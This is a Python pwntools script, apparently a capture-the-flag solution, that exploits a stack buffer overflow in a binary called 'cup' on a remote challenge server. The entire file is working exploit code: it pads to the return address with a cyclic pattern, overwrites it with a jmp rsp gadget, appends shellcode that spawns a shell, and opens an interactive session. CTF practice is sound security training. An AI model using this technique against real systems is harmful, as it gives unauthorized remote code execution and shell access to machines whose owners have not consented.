#!/usr/bin/env python


from pwn import *

BINARY = './cup'
LIBC = './libc.so.6'
LD = './ld-2.27.so'
ADDR = 'challenge.acictf.com'
DOCKER = 'localhost'
PORT = 55284

splash()
elf = context.binary = ELF(BINARY)
libc = ELF(LIBC, checksec=False)
ld = ELF(LD, checksec=False)

JMP_RSP = 0x400827


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process([ld.path, elf.path], env={"LD_PRELOAD": libc.path},
                       stdin=pty, stdout=pty, stderr=pty)
    if args.PWNDBG:
        context.log_level = 'debug'
        context.terminal = ['tmux', 'splitw', '-h']
        return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path},
                         gdbscript='''init-pwndbg''')
    if args.DOCKER:
        return remote(DOCKER, PORT)
    else:
        return remote(ADDR, PORT)


def solve():
    io = conn()

    payload = '9'
    payload += cyclic(cyclic_find(0x6161616161616e61, n=8), n=8)
    payload += p64(JMP_RSP)
    payload += asm(shellcraft.sh())
    io.sendline(payload)

    io.interactive()


if __name__ == "__main__":
    solve()
